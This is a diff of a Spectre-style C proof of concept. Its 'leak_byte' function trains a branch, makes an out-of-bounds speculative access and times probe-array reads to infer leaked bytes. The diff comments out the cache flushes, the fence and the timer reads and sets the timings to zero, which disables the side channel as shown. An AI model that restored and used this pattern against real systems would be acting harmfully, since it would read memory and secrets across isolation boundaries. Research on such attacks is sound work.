@@ -67,7 +67,7 @@ int leak_byte(int offset, char* leak) {
 
     // flush probe array from cache
     for (int i = 0; i < PROBE_SIZE; i += CACHE_LINE_SIZE) {
-      flush(probe_array + i);
+      // flush(probe_array + i);
     }
 
 
@@ -77,8 +77,8 @@ int leak_byte(int offset, char* leak) {
     int malicious_x = offset;
     // access pattern: 5 training runs and 1 out-of-bound access
     for (int i = 0; i < 1; i++) {
-      flush(&buf_size);
-      fence();
+      // flush(&buf_size);
+      // fence();
       // bit magic to prevent using a conditional jump
       x = ((j % 6) - 1) & ~0xFFFF;   /* Set x=FFF.FF0000 if j%6==0, else x=0 */
       x = (x | (x >> 16));           /* Set x=-1 if j&6=0, else x=0 */
@@ -94,11 +94,14 @@ int leak_byte(int offset, char* leak) {
       idx = (i * 167 + 13) & 255;
       
       // before = rdcycle(&junk2); high resolution timer
-      before = rdtime(&junk2);
+      // before = rdtime(&junk2);
+      before = 0;
+      
       junk += probe_array[idx * PAGE_SIZE];
       
       // after = rdcycle(&junk2);
-      after = rdtime(&junk2);
+      // after = rdtime(&junk2);
+      after = 0;
 
       elapsed[idx] = after - before;
       if (elapsed[idx] < CACHE_HIT_THRESHOLD && idx != training_x) {
